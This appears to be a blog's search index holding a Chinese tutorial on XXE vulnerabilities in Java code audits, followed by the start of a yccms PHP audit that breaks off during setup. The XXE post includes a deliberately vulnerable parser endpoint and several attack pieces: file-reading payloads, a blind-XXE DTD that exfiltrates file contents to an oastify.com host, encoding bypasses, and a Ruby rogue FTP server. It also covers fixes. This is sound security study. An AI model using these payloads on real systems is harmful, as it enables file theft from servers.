<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java代码审计中的XXE</title>
    <link href="/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/"/>
    <url>/2025/07/13/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84XXE/</url>
    
    <content type="html"><![CDATA[<h2 id="Java代码审计中的XXE"><a href="#Java代码审计中的XXE" class="headerlink" title="Java代码审计中的XXE"></a>Java代码审计中的XXE</h2><p>感觉第一次学到xxe这个漏洞时学的不是很好，现在再来深入学习一下</p><p>参考：<a href="https://drun1baby.top/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#Java-OWASP-%E4%B8%AD%E7%9A%84-XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Java OWASP 中的 XXE 代码审计 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>​  <a href="https://blog.csdn.net/qq_48201589/article/details/136421867">【Java代码审计】XXE_java xxe-CSDN博客</a></p><p>​<a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>代码审计基于此项目：<a href="https://github.com/JoyChou93/java-sec-code?tab=readme-ov-file">JoyChou93&#x2F;java-sec-code</a></p><h3 id="XML文档的格式与结构"><a href="#XML文档的格式与结构" class="headerlink" title="XML文档的格式与结构"></a>XML文档的格式与结构</h3><p><a href="https://www.freebuf.com/articles/web/318984.html">WEB安全&amp;JAVA代码审计：XXE外部实体注入 - FreeBuf网络安全行业门户</a></p><p>关于DTD：<a href="https://xz.aliyun.com/news/14107">JAVA XXE 从原理到利用-先知社区 (aliyun.com)</a></p><h3 id="判断XXE漏洞存在"><a href="#判断XXE漏洞存在" class="headerlink" title="判断XXE漏洞存在"></a>判断XXE漏洞存在</h3><ol><li>观察发送数据包中数据是否是xml格式</li><li>搜索处理XML文档相关的类与接口</li><li>开始测试，尝试是否能顺利访问DNS平台留下记录</li></ol><h3 id="审计中常见的类-接口"><a href="#审计中常见的类-接口" class="headerlink" title="审计中常见的类&#x2F;接口"></a>审计中常见的类&#x2F;接口</h3><p>xml文件的解析可用到的解析器有四种，对应不同的写法以及解析包</p><p>详细比较：<a href="https://blog.csdn.net/2501_90253336/article/details/145215020">Java进阶(五十一)XML 四种解析器(dom,sax,jdom,dom4j)原理及性能比较 java xml解析工具_java jdom-CSDN博客</a></p><h4 id="XMLReader-接口"><a href="#XMLReader-接口" class="headerlink" title="XMLReader(接口)"></a>XMLReader(接口)</h4><p>XMLReader接口是一种通过回调读取XML文档的接口，其存在于公共区域中。XMLReader接口是XML解析器实现SAX2驱动程序所必需的接口，其允许应用程序设置和查询解析器中的功能和属性、注册文档处理的事件处理程序，以及开始文档解析。当XMLReader使用默认的解析方法并且未对XML进行过滤时，会出现XXE漏洞</p><h4 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h4><p>SAXBuilder 是一个 JDOM 解析器，其能够将路径中的 XML 文件解析为 Document 对象。SAXBuilder 使用第三方 SAX 解析器来处理解析任务，并使用SAXHandler的实例侦听 SAX 事件。当SAXBuilder使用默认的解析方法并且未对XML进行过滤时，会出现 XXE 漏洞</p><h4 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h4><p>DOM4J是dom4j.org出品的一个开源XML解析包，使用起来非常简单，只要了解基本的XML-DOM模型，就能使用。DOM4J读&#x2F;写XML文档主要依赖于org.dom4j.io包，它有DOMReader和SAXReader两种方式。因为使用了同一个接口，所以这两种方式的调用方法是完全一致的。同样的，在使用默认解析方法并且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><p>SAXParserFactory使应用程序能够配置和获取基于SAX的解析器以解析XML文档。其受保护的构造方法，可以强制使用newInstance()。跟上面介绍的一样，在使用默认解析方法且未对XML进行过滤时，其也会出现XXE漏洞。</p><h4 id="Digester"><a href="#Digester" class="headerlink" title="Digester"></a>Digester</h4><p>Digester类用来将XML映射成Java类，以简化XML的处理。它是Apache Commons库中的一个jar包：common-digester包。一样的在默认配置下会出现XXE漏洞。其触发的XXE漏洞是没有回显的，我们一般需通过Blind XXE的方法来利用</p><h4 id="DocumentBuilderFactory"><a href="#DocumentBuilderFactory" class="headerlink" title="DocumentBuilderFactory"></a>DocumentBuilderFactory</h4><p>javax.xml.parsers包中的DocumentBuilderFactory用于创建DOM模式的解析器对象，DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance()方法，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。</p><p>由上述类与接口的功能与配置写法可知，如果使用默认的写法，一般都是会造成xxe漏洞的</p><p>需要使用安全写法或手动过滤</p><h3 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h3><p>最开始我们看到的 XMLReader 代码，以及其他的 xxxReader 代码，都是不回显的，因为它们只是对内容进行了解析，但是并没有对内容进行读取与输出。</p><ul><li>因为 XML 也是反序列化的一种，例如平常的 <code>Runtime.getRuntime.exe()</code> 是没有回显的，如果要有回显，必须要写 <code>byte[] code = ...</code> 这样子，把最后的结果读取出来。</li></ul><h4 id="DocumentBuilder-XXE"><a href="#DocumentBuilder-XXE" class="headerlink" title="DocumentBuilder XXE"></a>DocumentBuilder XXE</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>            <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>            <span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br>            <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br><br>            <span class="hljs-comment">// 遍历xml节点name和value</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            <span class="hljs-type">NodeList</span> <span class="hljs-variable">rootNodeList</span> <span class="hljs-operator">=</span> document.getChildNodes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;<br>                <span class="hljs-type">Node</span> <span class="hljs-variable">rootNode</span> <span class="hljs-operator">=</span> rootNodeList.item(i);<br>                <span class="hljs-type">NodeList</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> rootNode.getChildNodes();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; child.getLength(); j++) &#123;<br>                    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> child.item(j);<br>                    buf.append(String.format(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, node.getNodeName(), node.getTextContent()));<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> buf.toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            logger.error(e.toString());<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">Drunkbaby</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里环境搭建出了一些问题，流程分析就不动态调试了，手动追踪一下代码执行流程</p><p>在此列出一些比较重要的代码释义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">DocumentBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br></code></pre></td></tr></table></figure><p>定义了一个名为 <code>DocumentBuilderVuln</code> 的方法，接收 <code>HttpServletRequest</code> 对象作为参数，返回一个字符串。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br></code></pre></td></tr></table></figure><p>创建一个新的 XML 解析器工厂对象。</p><p><code>DocumnetBuilderFactory</code> 类用 <code>newInstance()</code> 的方式进行实例化。本身抽象类是不可以实例化的，但是 <code>DocumnetBuilderFactory</code> 自己定义了一个 <code>newInstance()</code> 实例化的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">db</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br></code></pre></td></tr></table></figure><p>从工厂中生成一个 XML 解析器（DocumentBuilder）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InputSource</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(request.getInputStream());<br></code></pre></td></tr></table></figure><p>将 HTTP 请求体作为输入流传入，用于解析 XML 数据，就是读入数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> db.parse(is);  <span class="hljs-comment">// parse xml</span><br></code></pre></td></tr></table></figure><p>解析 XML 数据，生成一个 DOM 树结构的 <code>Document</code> 对象。开始反序列化操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> buf.toString();<br></code></pre></td></tr></table></figure><p>最终可以看到调用了toString()方法，<mark>返回了拼好的字符串</mark>，所以这个方法是有回显的,能够用来读取一些文件内容</p><h3 id="无回显的XXE"><a href="#无回显的XXE" class="headerlink" title="无回显的XXE"></a>无回显的XXE</h3><p>返回包中是看不到字符串回显的</p><p>一般使用DNS检测来打无回显</p><h4 id="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的"><a href="#XMLReader，SAXBuilder，SAXReader，SAXParser，Digester-这几个函数都是无回显的" class="headerlink" title="XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的"></a>XMLReader，SAXBuilder，SAXReader，SAXParser，Digester 这几个函数都是无回显的</h4><p>测试xxe漏洞是否存在只需要使用DNS检测即可</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zehfrya24b6tjn2oz8w00x6pegk784wt.oastify.com&quot;</span>&gt;</span> ]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>漏洞利用(利用dns外带数据)</p><p>将一个恶意的DTD放在自己的vps上</p><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/1.txt&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span><br>%eval;<br>%exfil;<br></code></pre></td></tr></table></figure><p>它将读取本地文件 <code>E:/1.txt</code>。</p><p>然后访问如下 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://pg9ydrnt7kzybog1jz9hyjmtuk0aoz.oastify.com/?x=&lt;文件内容&gt;<br></code></pre></td></tr></table></figure><p>文件内容就这样泄露到了攻击者控制的域名。</p><ul><li>原理上来说是这样的：</li></ul><p>有时候如果 xxe 当中如果服务端没有正确处理好使用 try catch，那么如果抛出异常 Web 界面通常会显示这个错误，所以我们可以如此攻击。</p><p>之前实操的时候是能看到网页回显是有报错的，但是dns平台有记录</p><p>发包攻击</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">admin</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY %remote <span class="hljs-keyword">SYSTEM</span> </span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;http://vps地址/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"> %remote;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>攻击顺利是能看到返回的dns记录中url参数中有x&#x3D;…(文件内容)</p><p>这里环境调试出了一些问题，很遗憾没有看到成功的dns外带数据</p><h3 id="XXE漏洞的修复"><a href="#XXE漏洞的修复" class="headerlink" title="XXE漏洞的修复"></a>XXE漏洞的修复</h3><p>修复的手段主要就是一种：禁用外部实体 DTD。对于不同的解析器有不同的修复手段。</p><p>(外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，禁止外部实体，防止外部恶意文件加载)</p><p>关键语句就是这两句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">xif</span> <span class="hljs-operator">=</span> XMLInputFactory.newInstance();<br>        <span class="hljs-comment">// 不支持外部实体</span><br>       <span class="hljs-comment">// 后面两行是多加的代码 </span><br>        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 不支持dtd</span><br>        xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h3 id="绕过手法与trick"><a href="#绕过手法与trick" class="headerlink" title="绕过手法与trick"></a>绕过手法与trick</h3><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span><br>+ADwAIQ-DOCTYPE ANY +AFs-<br>  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-<br>+AF0APg-<br>+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-<br></code></pre></td></tr></table></figure><h4 id="Java-XML-DTD-的-trick-利用"><a href="#Java-XML-DTD-的-trick-利用" class="headerlink" title="Java XML DTD 的 trick 利用"></a>Java XML DTD 的 trick 利用</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">evil</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///&quot;</span> &gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;netdoc://%evil;&#x27;&gt;&quot;</span>&gt;</span><br>%print;<br></code></pre></td></tr></table></figure><h4 id="解决文件跨行传输——-ftp-jdk1-7"><a href="#解决文件跨行传输——-ftp-jdk1-7" class="headerlink" title="解决文件跨行传输—— ftp&amp;jdk1.7+"></a>解决文件跨行传输—— ftp&amp;jdk1.7+</h4><p>看到这部分的时候觉得好厉害，居然还可以这样做</p><p>在 XXE 盲注中，通过 http 协议访问我们的服务器会只获取被读取的文件第一行。</p><p>在 jdk1.7 以前，可以通过http协议传输具有换行的文件的。因为java会对换行符进行URL编码然后就访问一个地址。</p><p>但是1.7之后，就修复了这个问题，会报错。</p><p>但是我们仍然可以用ftp服务器来接受换行文件，因为ftp没有进行类似的限制，换行之后的字符会被当做CWD命令输入。</p><p>需要起一个<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">恶意的FTP服务器</a>，其他按照正常的XXE盲注打。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XMl"><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % c <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#x27;ftp://127.0.0.1:2121/%b;&#x27;&gt;&quot;</span>&gt;</span><br>%c;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">asd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8088/&quot;</span>&gt;</span> </span><br><span class="hljs-meta">   %asd; </span><br><span class="hljs-meta">   %rrr; </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>启动ftp-server</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">require <span class="hljs-string">&#x27;socket&#x27;</span><br><br>ftp_server = TCPServer.new <span class="hljs-number">2121</span><br>http_server = TCPServer.new <span class="hljs-number">8088</span><br><br><span class="hljs-built_in">log</span> = File.open( <span class="hljs-string">&quot;xxe-ftp.log&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;&lt;!ENTITY % b SYSTEM &quot;file:///tmp/1.txt&quot;&gt;</span><br><span class="hljs-string">           &lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM \&#x27;</span>ftp:<span class="hljs-comment">//127.0.0.1:2121/%b;\&#x27;&gt;&quot;&gt;</span><br>           %c;&#x27;<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(http_server.accept) <span class="hljs-keyword">do</span> |http_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. New client connected&quot;</span><br>loop &#123;<br>req = http_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-keyword">if</span> req.start_with? <span class="hljs-string">&quot;GET&quot;</span><br>http_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nContent-length: #&#123;payload.length&#125;\r\n\r\n#&#123;payload&#125;&quot;</span>)<br>end<br><span class="hljs-built_in">puts</span> req<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. Connection closed&quot;</span><br>  end<br>end<br><br>end<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(ftp_server.accept) <span class="hljs-keyword">do</span> |ftp_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. New client connected&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;220 xxe-ftp-server&quot;</span>)<br>loop &#123;<br>req = ftp_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&lt; &quot;</span>+req<br><span class="hljs-built_in">log</span>.write <span class="hljs-string">&quot;get req: #&#123;req.inspect&#125;\n&quot;</span><br><br><span class="hljs-keyword">if</span> req.include? <span class="hljs-string">&quot;LIST&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;150 Opening BINARY mode data connection for /bin/ls&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;226 Transfer complete.&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;USER&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;331 password please - version check&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;PORT&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;! PORT received&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 200 PORT command ok&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;200 PORT command ok&quot;</span>)<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 230 more data please!&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;230 more data please!&quot;</span>)<br>end<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. Connection closed&quot;</span><br>  end<br>end<br>end<br><br>loop <span class="hljs-keyword">do</span><br>sleep(<span class="hljs-number">10000</span>)<br>end<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>代码审计一般只需要通过打DNS得到访问记录判断此漏洞存在即可</li><li>实际利用此漏洞(无回显)需要通过dns外带数据得到敏感信息</li><li>http传输一般只会读取文件第一行，可以通过开启恶意ftp服务读取换行文件</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms代码审计(php)</title>
    <link href="/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms代码审计-php"><a href="#yccms代码审计-php" class="headerlink" title="yccms代码审计(php)"></a>yccms代码审计(php)</h1><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ul><li>更改config.inc.php对应的数据库名，用户名及密码即可</li><li>运行yccms.sql文件，在数据库中导入sql数据</li><li>访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台</li></ul><h3 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="配置xdebug"></a>配置xdebug</h3><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul><li><p><a href="https://segmentfault.com/a/1190000018961750">2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - SegmentFault 思否</a></p></li><li><p>小迪安全php代码审计课程 day108</p></li><li><p><a href="https://mp.weixin.qq.com/s/7K8edea8imalZ8_jJp3ODw">phpstorm+phpstudy 配置xdebug (qq.com)</a></p></li></ul><h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><ul><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;sever</p><p>新建一个服务器，名称任意，端口与网站搭建端口一致</p><p><img src="/img/yccms/yccms02.png" 